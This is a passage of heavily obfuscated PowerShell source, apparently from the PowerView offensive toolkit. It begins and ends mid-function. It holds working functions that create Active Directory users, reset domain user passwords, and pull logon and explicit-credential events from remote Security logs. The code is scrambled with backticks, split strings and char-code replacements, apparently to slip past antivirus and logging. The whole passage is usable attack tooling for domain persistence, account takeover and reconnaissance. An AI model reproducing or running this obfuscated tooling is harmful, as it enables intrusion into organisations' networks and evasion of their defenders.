                    }
                    ${Expi`RETi`mE} = (&("{1}{2}{0}"-f 'ate','Ge','t-D')).("{1}{2}{0}"-f'dDays','A','d').Invoke(-${maxi`mu`m`AGe}).("{2}{0}{1}"-f'ileTi','meUtc','ToF').Invoke()
                    if (${Pw`dLas`TsET} -le ${ExP`i`R`ETime}) {
                        ${COn`TiN`Ue} = ${f`Alse}
                    }
                }
            }
            if (${c`on`TINUE}) {
                if (${ps`BOu`NDpARa`mEtE`Rs}['Raw']) {
                    
                    ${U`SEr} = ${_}
                    ${us`er}."pSOBj`Ect"."ty`Pen`AMeS".("{0}{1}" -f'I','nsert').Invoke(0, ("{3}{0}{2}{1}"-f 'erView.','ser.Raw','U','Pow'))
                }
                else {
                    ${U`ser} = &("{3}{4}{5}{0}{2}{1}" -f 'AP','perty','Pro','C','onve','rt-LD') -Properties ${P`ROp}
                    ${uS`Er}."P`s`oBjecT"."Ty`pEna`meS".("{1}{0}{2}"-f'er','Ins','t').Invoke(0, ("{3}{2}{1}{0}" -f'ser','U','werView.','Po'))
                }
                ${u`SeR}
            }
        }
        if (${res`UL`TS}) {
            try { ${re`sU`LTS}.("{0}{1}" -f 'd','ispose').Invoke() }
            catch { }
        }
    }
}


function N`Ew-dO`ma`In`USER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{9}{6}{2}{7}{4}{5}{10}{3}{11}{8}" -f 'Us','PS','ldProce','n','rS','tateCh','Shou','ssFo','tions','e','a','gingFunc'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{0}{1}{3}"-f 'P','roc','Should','ess','PS'}, '')]
    [OutputType({"{11}{0}{7}{10}{1}{12}{2}{9}{3}{5}{6}{8}{13}{4}"-f'r','Servi','.A','unt','al','Mana','geme','ect','nt.UserP','cco','ory','Di','ces','rincip'})]
    Param(
        [Parameter(mAnDAtORY = ${t`Rue})]
        [ValidateLength(0, 256)]
        [String]
        ${sa`M`Account`NAmE},

        [Parameter(manDaToRY = ${T`RUE})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f 'ord','Pass','w'})]
        [Security.SecureString]
        ${accOUN`TP`Ass`WorD},

        [ValidateNotNullOrEmpty()]
        [String]
        ${na`mE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`is`PlAyNA`me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Des`Cri`PtIoN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOmA`In},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cReD`EntI`AL} =   (  GeT-VaRIable  ("7Tq"+"02") -VaLUE  )::"em`ptY"
    )

    ${COnTe`XTA`RgU`mENts} = @{
        ("{2}{0}{1}" -f 'd','entity','I') = ${SaM`ACcO`U`NtnAMe}
    }
    if (${PsboU`N`DparaMEte`RS}[("{0}{1}"-f'Doma','in')]) { ${c`Ont`extar`Gum`EntS}[("{1}{0}" -f 'omain','D')] = ${d`O`maiN} }
    if (${PsBOU`NdpA`RA`meTERs}[("{2}{0}{1}"-f'redentia','l','C')]) { ${CO`N`TeXt`ARGU`m`eNts}[("{2}{1}{0}"-f 'ial','redent','C')] = ${C`REDEnTi`Al} }
    ${co`NtexT} = &("{3}{0}{1}{2}"-f 'ri','ncipalC','ontext','Get-P') @ContextArguments

    if (${con`T`EXt}) {
        ${u`Ser} = &("{1}{2}{0}"-f 'ject','Ne','w-Ob') -TypeName ("{3}{1}{4}{8}{5}{6}{11}{2}{7}{0}{10}{9}"-f'cip','tem.Direct','ent.User','Sys','o','c','co','Prin','ryServices.A','l','a','untManagem') -ArgumentList (${CoN`T`Ext}."cON`T`ext")

        
        ${US`eR}."S`AmaCcOuNtNa`me" = ${C`ONt`eXT}."IdeNT`Ity"
        ${t`emPc`Red} = &("{0}{1}{2}"-f'New-Ob','je','ct') ("{7}{6}{9}{3}{0}{1}{8}{2}{4}{5}"-f 'nagemen','t.Auto','.PSCre','a','d','ential','y','S','mation','stem.M')('a', ${aCcOu`Ntpa`ssWoRd})
        ${u`seR}.("{3}{1}{0}{2}"-f 'swor','s','d','SetPa').Invoke(${te`M`PCred}.("{2}{5}{4}{1}{0}{3}"-f'ti','eden','GetN','al','workCr','et').Invoke()."p`ASSWOrD")
        ${U`SEr}."e`NaBLED" = ${T`RuE}
        ${U`SEr}."pasSwor`dNo`TR`Eq`UIrEd" = ${Fal`SE}

        if (${PsbOUn`dpa`R`AMETE`RS}[("{1}{0}"-f 'me','Na')]) {
            ${Us`eR}."n`AMe" = ${Na`ME}
        }
        else {
            ${U`SEr}."Na`ME" = ${c`OnTEXt}."ideNt`i`Ty"
        }
        if (${PsBo`Und`P`AraMEt`E`Rs}[("{2}{0}{1}{3}"-f 'pla','yNa','Dis','me')]) {
            ${Us`ER}."DiSp`l`A`yNAME" = ${Di`S`pla`YNAME}
        }
        else {
            ${U`Ser}."D`ispLAy`NAME" = ${C`o`NteXT}."IdeNt`Ity"
        }

        if (${PSBO`UN`Dp`ArA`MeTErs}[("{1}{0}{2}" -f 'pt','Descri','ion')]) {
            ${US`eR}."DescRIp`T`ioN" = ${dESc`Ri`ptION}
        }

        &("{3}{2}{0}{1}{4}" -f 't','e','i','Wr','-Verbose') ('[New'+'-DomainUs'+'e'+'r] '+'A'+'t'+'tem'+'pting '+'to'+' '+'c'+'r'+'eate '+'use'+'r '+"'$SamAccountName'")
        try {
            ${N`UlL} = ${us`Er}.("{0}{1}"-f'S','ave').Invoke()
            &("{2}{0}{1}"-f'-Ve','rbose','Write') ('['+'N'+'ew-DomainUser'+'] '+'U'+'ser '+"'$SamAccountName' "+'successf'+'ull'+'y '+'cr'+'eat'+'ed')
            ${u`SER}
        }
        catch {
            &("{0}{1}{3}{2}" -f 'Writ','e-War','ing','n') ('[New-Dom'+'ai'+'n'+'Use'+'r] '+'Er'+'ror '+'creati'+'ng '+'use'+'r '+"'$SamAccountName' "+': '+"$_")
        }
    }
}


function set`-Do`MAInUSerp`AssWORd {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{6}{7}{5}{8}{4}{1}{0}" -f 'ions','unct','P','S','gF','ForSta','UseShouldProces','s','teChangin'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{2}{1}{4}" -f'PSSho','Pr','d','ul','ocess'}, '')]
    [OutputType({"{7}{1}{11}{4}{5}{10}{12}{2}{9}{13}{8}{3}{6}{0}" -f 'ipal','ectory','age','U','ce','s','serPrinc','Dir','t.','me','.A','Servi','ccountMan','n'})]
    Param(
        [Parameter(POSitiOn = 0, mANdaTorY = ${tR`UE})]
        [Alias({"{1}{0}" -f'serName','U'}, {"{0}{2}{1}" -f'UserIde','ty','nti'}, {"{0}{1}"-f'Us','er'})]
        [String]
        ${IDeNt`ITy},

        [Parameter(mAnDatoRy = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'd','Passwo','r'})]
        [Security.SecureString]
        ${A`c`countPASSWO`RD},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOMa`IN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Re`DENt`iAl} =  (  lS  ("{0}{2}{1}{3}"-f'vA','tq','RiABlE:7','02'))."vAL`UE"::"eMp`TY"
    )

    ${COnt`Ext`ARGumen`TS} = @{ ("{1}{2}{0}"-f 'ty','Iden','ti') = ${i`D`EnTity} }
    if (${P`sbOU`Nd`P`ARAmet`ERS}[("{0}{1}"-f'D','omain')]) { ${coNTExta`RgU`Me`Nts}[("{0}{1}" -f'D','omain')] = ${D`O`Main} }
    if (${psBoUN`d`pa`RAmEt`E`Rs}[("{3}{0}{2}{1}"-f 'de','tial','n','Cre')]) { ${ConTEXta`RGU`m`en`TS}[("{0}{1}{2}" -f'Cred','en','tial')] = ${CR`ED`en`TIal} }
    ${C`oNTEXT} = &("{0}{1}{2}{4}{3}" -f'Get-Pr','incipalC','o','text','n') @ContextArguments

    if (${cO`NtE`xt}) {
        ${Us`ER} = [System.DirectoryServices.AccountManagement.UserPrincipal]::("{4}{3}{0}{2}{1}"-f 'd','ity','ent','ByI','Find').Invoke(${c`o`NteXt}."ConT`E`xt", ${IdEN`T`ity})

        if (${u`seR}) {
            &("{4}{3}{0}{1}{2}" -f'b','o','se','rite-Ver','W') ('['+'Set'+'-DomainUse'+'rPa'+'s'+'sword] '+'A'+'tte'+'mpti'+'ng '+'t'+'o '+'se'+'t '+'the'+' '+'pa'+'ssword '+'f'+'or '+'user'+' '+"'$Identity'")
            try {
                ${t`EM`pcREd} = &("{2}{0}{3}{1}"-f 'ew-Obj','t','N','ec') ("{0}{2}{10}{6}{7}{8}{5}{3}{9}{4}{1}"-f 'System','ial','.M','utomation.PSC','t','A','na','gemen','t.','reden','a')('a', ${AcCO`UnTPa`S`s`WOrd})
                ${U`ser}.("{0}{3}{2}{1}"-f 'Se','rd','o','tPassw').Invoke(${TEM`pcrEd}.("{3}{0}{2}{1}" -f 'workCred','al','enti','GetNet').Invoke()."Pa`Ssw`orD")

                ${NU`LL} = ${us`eR}.("{1}{0}" -f've','Sa').Invoke()
                &("{2}{1}{3}{0}{4}"-f 'erb','ri','W','te-V','ose') ('[Set-Dom'+'ai'+'n'+'U'+'serPa'+'ssword]'+' '+'Passw'+'o'+'rd '+'fo'+'r '+'u'+'ser '+"'$Identity' "+'su'+'cc'+'essfull'+'y '+'res'+'et')
            }
            catch {
                &("{0}{1}{4}{3}{2}" -f 'Write','-','ning','r','Wa') ('[Set-'+'D'+'oma'+'inUs'+'erPass'+'wor'+'d'+'] '+'Er'+'ro'+'r '+'se'+'tt'+'ing '+'p'+'a'+'ssword '+'f'+'or '+'u'+'ser '+"'$Identity' "+': '+"$_")
            }
        }
        else {
            &("{3}{0}{1}{2}"-f'ite-War','nin','g','Wr') ('[Set-'+'DomainU'+'serPassw'+'or'+'d] '+'Unab'+'le '+'to'+' '+'find'+' '+'us'+'er '+"'$Identity'")
        }
    }
}


function Get-do`MAIN`U`s`ErevEnT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}"-f'ess','PSShou','ldProc'}, '')]
    [OutputType({"{5}{3}{6}{0}{1}{2}{4}" -f'w.Logo','nEv','en','r','t','Powe','Vie'})]
    [OutputType({"{5}{2}{0}{4}{7}{3}{1}{6}"-f'.','E','iew','CredentialLogon','Exp','PowerV','vent','licit'})]
    [CmdletBinding()]
    Param(
        [Parameter(PositIon = 0, VaLUEFrOmPIPElINe = ${TR`Ue}, VAlUeFrOMpipeLiNebyPROPeRtYNaMe = ${T`Rue})]
        [Alias({"{2}{0}{1}" -f'nam','e','dnshost'}, {"{1}{2}{0}" -f 'e','H','ostNam'}, {"{0}{1}"-f 'n','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOM`pu`TeR`NaME} = ${e`Nv:`COmPut`e`RnaMe},

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${STAr`T`T`imE} =  (ItEm ("{3}{2}{1}{0}{4}"-f 't','9','iAble:f','Var','47y')  )."V`ALUe"::"N`Ow".("{1}{2}{0}"-f'ays','A','ddD').Invoke(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${EN`d`TIMe} =   (  vARiaBLE ("{1}{2}{0}" -f'Y','f9T','47') )."V`AlUE"::"n`OW",

        [ValidateRange(1, 1000000)]
        [Int]
        ${MA`xEVeN`TS} = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`EDe`NtIAl} =   (  ls  ("{3}{1}{0}{2}" -f 'q0','e:7T','2','varIABL')  )."VAL`UE"::"emP`Ty"
    )

    BEGIN {
        
        ${xPat`hF`i`LtER} = ((('A'+'fH'+'
<Que'+'ryLis'+'t>
 ')-cReplaCE ([CHAR]65+[CHAR]102+[CHAR]72),[CHAR]34)+' '+' '+' '+'<'+'Query '+(('Id'+'=Pj'+'d0Pj'+'d ')-REpLace ([CHar]80+[CHar]106+[CHar]100),[CHar]34)+('Path={0'+'}Se'+'cur'+'it'+'y{'+'0}'+'>

 ')  -f [CHAr]34+' '+' '+' '+' '+' '+' '+' '+'<!--'+' '+'L'+'o'+'gon '+'e'+'ven'+'ts '+'-->'+''+'
 '+' '+' '+' '+' '+' '+' '+' '+'<S'+'elec'+'t '+('Path'+'=Y'+'Rf'+'Secu'+'rit'+'yYRf>
'+' ')."r`ePlaCe"(([cHaR]89+[cHaR]82+[cHaR]102),[striNg][cHaR]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'ys'+'tem[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Pro'+'vid'+'er['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@Name=mZ0Micro'+'sof'+'t'+'-Win'+'d'+'ows-'+'Secu'+'r'+'ity'+'-AuditingmZ0
'+' ')-crePlAcE([CHaR]109+[CHaR]90+[CHaR]48),[CHaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d '+'(Leve'+'l'+'=4'+' '+'or'+' '+'Level='+'0'+')'+' '+'an'+'d '+'(Even'+'tID=4'+'624)
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'nd '+'Ti'+'meCr'+'eated[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@System'+'Ti'+'me&gt;=dU'+'yM'+'u'+'Y(Mu'+'YSt'+'a'+'rtTime.ToUni'+'v'+'ersal'+'Time'+'().ToString('+'dU'+'ysdUy'+'))d'+'Uy ')-CRepLaCE  ([CHaR]77+[CHaR]117+[CHaR]89),[CHaR]36  -RePLaCe ([CHaR]100+[CHaR]85+[CHaR]121),[CHaR]39)+'an'+'d '+('@System'+'T'+'ime'+'&lt;={0}{1}({1}EndTime.ToUniv'+'ersalTime'+'().'+'ToS'+'tr'+'ing({0}s{'+'0}))'+'{'+'0}'+'
 ')-F [char]39,[char]36+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('*[EventDa'+'ta['+'Dat'+'a'+'[@'+'Nam'+'e={'+'0}'+'TargetUse'+'rNa'+'me{0'+'}]'+' ')  -f [CHar]39+'!'+'= '+('{'+'0'+'}ANONY'+'MOUS ') -F  [CHaR]39+('LO'+'GONGS'+'f]]
 ')."r`E`place"(([CHAr]71+[CHAr]83+[CHAr]102),[stRIng][CHAr]39)+' '+' '+' '+' '+' '+' '+' '+'</Select'+'>'+'

 '+' '+' '+' '+' '+' '+' '+' '+'<'+'!-- '+'L'+'ogon '+'wi'+'th '+'e'+'xpl'+'icit '+'cr'+'edentia'+'l'+' '+'ev'+'ents'+' '+'--'+'>
 '+' '+' '+' '+' '+' '+' '+' '+'<Se'+'le'+'ct '+(('Path=PHV'+'SecurityP'+'H'+'V>'+'
 ') -repLacE([ChAR]80+[ChAR]72+[ChAR]86),[ChAR]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'y'+'stem['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Pr'+'ovider[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@N'+'ame'+'={0}Micr'+'osoft-Windows-Sec'+'uri'+'ty-Audi'+'ting'+'{'+'0}
 ')  -f  [chAR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'nd '+'(Le'+'v'+'el=4 '+'o'+'r '+'Leve'+'l=0)'+' '+'an'+'d '+'(E'+'v'+'ent'+'I'+'D=4'+'648)
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+' '+'TimeCre'+'ate'+'d[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@'+'S'+'ys'+'te'+'mTime&gt;=AxY'+'BCj(B'+'C'+'jSt'+'art'+'T'+'ime.ToUn'+'ivers'+'al'+'T'+'i'+'me'+'()'+'.ToSt'+'ring'+'(AxY'+'sAx'+'Y'+'))Ax'+'Y ')."r`EPLA`Ce"('AxY',[stRING][CHAr]39)."re`Pla`cE"(([CHAr]66+[CHAr]67+[CHAr]106),[stRING][CHAr]36)+'a'+'nd '+('@S'+'y'+'ste'+'mTi'+'me&lt'+';={0}'+'{'+'1}'+'({'+'1}'+'End'+'Time.'+'T'+'oUniv'+'ersalTim'+'e().ToStri'+'n'+'g'+'({'+'0'+'}s'+'{0})'+'){'+'0}
 ')-F[ChaR]39,[ChaR]36+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+'</S'+'el'+'ect>'+'

 '+' '+' '+' '+' '+' '+' '+' '+'<S'+'u'+'ppress '+('Pa'+'th='+'wz'+'VSecuritywz'+'V>
 ')."rE`plAcE"('wzV',[String][cHAR]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Syste'+'m'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'P'+'ro'+'vider[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@Na'+'me'+'='+'q2GMicro'+'sof'+'t-Win'+'dow'+'s-S'+'ec'+'ur'+'ity'+'-Auditingq2G
 ')."RE`p`LacE"('q2G',[STriNG][chAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'(Lev'+'el=4 '+'o'+'r '+'Lev'+'el='+'0)'+' '+'an'+'d '+'(Even'+'tID=4'+'62'+'4 '+'or'+' '+'EventI'+'D'+'=4625 '+'or'+' '+'Even'+'tID'+'=4634)'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'ve'+'ntData'+'['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'('+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('(D'+'at'+'a[@'+'Name={0}Lo'+'gon'+'Type{0}]'+'={0}5{'+'0} ') -F  [CHar]39+'or'+' '+('D'+'ata[@'+'Name=QHh'+'L'+'o'+'go'+'n'+'T'+'ypeQH'+'h]=Q'+'Hh0QHh)
'+' ')."REP`l`AcE"('QHh',[String][ChaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'or'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('Dat'+'a[@Name'+'=e'+'4X'+'Ta'+'rgetU'+'serN'+'amee4X]=e4XA'+'NON'+'YM'+'O'+'US'+' ') -CrePlAce 'e4X',[CHar]39)+(('LOGONs'+'P'+'v
 ')  -REpLaCe'sPv',[CHAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'or'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('Data'+'[@'+'Name=7pATar'+'get'+'Us'+'erSID7pA]'+'=7pA'+'S'+'-'+'1-5-'+'187p'+'A
 ')."rE`P`lace"(([Char]55+[Char]112+[Char]65),[String][Char]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+')
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+'<'+'/'+'Suppres'+'s>
 '+' '+' '+' '+('</Query>'+'
'+'</Qu'+'eryL'+'ist>'+''+'
{0}')  -F  [char]34)
        ${eve`NTAr`gU`MeNTS} = @{
            ("{1}{0}{3}{2}" -f'lterX','Fi','h','Pat') = ${xPaThF`I`lT`ER}
            ("{0}{1}{2}" -f 'Log','N','ame') = ("{0}{2}{1}"-f'Se','ty','curi')
            ("{2}{1}{0}" -f'nts','ve','MaxE') = ${MAx`Eve`NtS}
        }
        if (${P`Sb`oun`d`PAraME`Ters}[("{2}{0}{1}" -f'enti','al','Cred')]) { ${E`Ve`NTA`RgUme`Nts}[("{2}{0}{1}" -f'ti','al','Creden')] = ${CRe`d`eNti`AL} }
    }

    PROCESS {
        ForEach (${c`OmP`UtER} in ${C`om`pUtE`RNa`ME}) {

            ${Ev`enTAr`g`UmEn`TS}[("{0}{3}{1}{2}"-f 'Co','terNam','e','mpu')] = ${co`M`PuTer}

            &("{0}{2}{3}{1}" -f 'G','vent','et','-WinE') @EventArguments| &("{1}{0}{3}{2}"-f 'a','ForE','ect','ch-Obj') {
                ${e`VEnT} = ${_}
                ${Pr`OPe`RTies} = ${Eve`NT}."pr`O`PerTIeS"
                Switch (${eve`Nt}."I`d") {
                    
                    4624 {
                        
                        if(-not ${pro`PE`RT`IES}[5]."vAL`UE".("{2}{1}{0}" -f 'With','nds','E').Invoke('$')) {
                            ${O`U`TpuT} = &("{1}{0}{2}"-f'-O','New','bject') ("{0}{1}" -f'P','SObject') -Property @{
                                ("{1}{2}{0}" -f'e','Comput','erNam')              = ${C`o`mPu`TER}
                                ("{0}{2}{1}" -f 'T','ed','imeCreat')               = ${e`VENT}."TI`meCReA`TeD"
                                ("{0}{1}" -f 'Event','Id')                   = ${E`V`EnT}."I`d"
                                ("{1}{0}{2}{3}"-f 'jec','Sub','tUs','erSid')            = ${PRoP`er`TiES}[0]."VaL`Ue".("{2}{0}{1}"-f 'oStri','ng','T').Invoke()
                                ("{3}{2}{0}{1}" -f'ject','UserName','b','Su')           = ${pRo`PeRTI`es}[1]."val`UE"
                                ("{4}{0}{3}{1}{2}"-f'ectDo','in','Name','ma','Subj')         = ${P`ROPE`RTiEs}[2]."V`ALUE"
                                ("{1}{0}{2}{3}"-f 'u','S','b','jectLogonId')            = ${p`R`opERt`ies}[3]."v`AlUe"
                                ("{2}{0}{1}" -f 'tUs','erSid','Targe')             = ${P`RoPERT`iES}[4]."VaL`Ue".("{2}{1}{0}"-f'g','trin','ToS').Invoke()
                                ("{4}{2}{1}{3}{0}" -f 'e','serNa','rgetU','m','Ta')            = ${pROpE`Rti`Es}[5]."v`ALUE"
                                ("{0}{1}{2}" -f 'TargetDomai','nN','ame')          = ${P`RoPE`RtIES}[6]."va`LUE"
                                ("{1}{2}{3}{0}" -f'onId','Ta','rget','Log')             = ${PROpert`i`Es}[7]."VA`LuE"
                                ("{0}{1}{2}" -f 'Log','onTy','pe')                 = ${P`Rop`ERties}[8]."V`ALUe"
                                ("{1}{3}{4}{2}{0}"-f 'cessName','Lo','Pro','go','n')          = ${P`Roperti`ES}[9]."vA`lUE"
                                ("{6}{1}{4}{2}{5}{0}{3}"-f'eNam','uthenticat','nPac','e','io','kag','A') = ${pr`o`PERTIEs}[10]."v`AlUE"
                                ("{3}{0}{1}{2}" -f 'r','kstationN','ame','Wo')           = ${pr`oPert`IeS}[11]."Val`UE"
                                ("{2}{0}{1}" -f 'gonGu','id','Lo')                 = ${PrOp`e`R`TIEs}[12]."VaL`Ue"
                                ("{2}{1}{3}{0}"-f'dServices','ansmitt','Tr','e')       = ${prop`ert`IES}[13]."va`LUe"
                                ("{3}{1}{0}{2}"-f'am','mPackageN','e','L')             = ${Pr`OPE`Rt`Ies}[14]."Val`Ue"
                                ("{0}{2}{1}"-f'K','ength','eyL')                 = ${pr`oP`erTIeS}[15]."v`Alue"
                                ("{0}{1}{2}"-f'Proc','e','ssId')                 = ${p`ROPE`RtieS}[16]."v`ALUe"
                                ("{3}{1}{0}{2}"-f 'c','o','essName','Pr')               = ${P`ROpErT`iES}[17]."Va`LUE"
                                ("{0}{2}{1}"-f'IpA','s','ddres')                 = ${p`Ro`PERTiEs}[18]."vA`lUE"
                                ("{0}{2}{1}" -f 'I','t','pPor')                    = ${pR`O`pe`RTies}[19]."v`ALUE"
                                ("{1}{5}{4}{3}{2}{0}" -f'Level','Imp','on','ati','rson','e')        = ${p`Rop`ERties}[20]."VaL`UE"
                                ("{3}{5}{0}{4}{2}{1}" -f'r','nMode','mi','Re','ictedAd','st')       = ${p`RO`pErT`ieS}[21]."Val`Ue"
                                ("{6}{4}{0}{5}{1}{2}{3}"-f'e','bou','ndUserN','ame','g','tOut','Tar')    = ${prOPER`T`iES}[22]."V`ALue"
                                ("{3}{4}{1}{5}{0}{2}"-f'tb','rgetO','oundDomainName','T','a','u')  = ${PROp`E`RtIEs}[23]."Va`luE"
                                ("{1}{0}{3}{2}"-f'irtual','V','ount','Acc')            = ${PRoP`e`Rt`iEs}[24]."va`lUE"
                                ("{0}{4}{3}{2}{1}" -f'TargetLin','d','gonI','dLo','ke')       = ${PRop`erTI`Es}[25]."v`ALue"
                                ("{0}{4}{3}{1}{2}"-f'Ele','dTo','ken','e','vat')             = ${Pr`OpERti`es}[26]."va`Lue"
                            }
                            ${o`UTPut}."p`sOBJe`Ct"."tyPe`NA`m`Es".("{0}{1}" -f'Inser','t').Invoke(0, ("{4}{2}{5}{1}{0}{3}"-f 'ogonEve','L','wer','nt','Po','View.'))
                            ${Ou`Tp`Ut}
                        }
                    }

                    
                    4648 {
                        
                        if((-not ${prOpeRT`I`Es}[5]."VA`lUE".("{0}{1}" -f 'Ends','With').Invoke('$')) -and (${pr`OP`erties}[11]."Va`lue" -match ((("{3}{0}{4}{1}{2}{5}" -f'ho','2Z','.','task','sto','exe'))."rEPL`AcE"('o2Z',[STriNg][CHAr]92)))) {
                            ${O`U`TpUT} = &("{0}{2}{1}"-f 'N','ct','ew-Obje') ("{2}{0}{1}" -f 'S','Object','P') -Property @{
                                ("{0}{1}{2}"-f 'Com','put','erName')              = ${CO`mPUTer}
                                ("{2}{0}{3}{1}"-f'i','eated','T','meCr')       = ${e`Ve`NT}."TiMeCr`e`AtED"
                                ("{0}{1}"-f 'Event','Id')           = ${E`VEnT}."Id"
                                ("{0}{3}{4}{1}{2}"-f'S','rSi','d','ubject','Use')    = ${pR`OpeRTI`ES}[0]."vaL`UE".("{1}{0}" -f'ring','ToSt').Invoke()
                                ("{4}{2}{0}{1}{3}"-f 'N','a','ser','me','SubjectU')   = ${prOP`eR`Ti`eS}[1]."vA`LUe"
                                ("{0}{1}{2}{3}{4}" -f'Subj','ectD','o','mainNa','me') = ${Prop`er`TIEs}[2]."VAL`UE"
                                ("{2}{4}{0}{1}{3}"-f'L','og','S','onId','ubject')    = ${PR`oper`T`iES}[3]."v`ALUE"
                                ("{1}{0}"-f 'Guid','Logon')         = ${P`Rop`ErT`iEs}[4]."V`ALUE".("{2}{0}{1}" -f 'Str','ing','To').Invoke()
                                ("{1}{2}{0}" -f'ame','Targ','etUserN')    = ${PRO`PeRT`IEs}[5]."V`AlUe"
                                ("{3}{0}{4}{2}{1}" -f 'Do','ame','inN','Target','ma')  = ${Pro`pErT`IeS}[6]."vA`LUe"
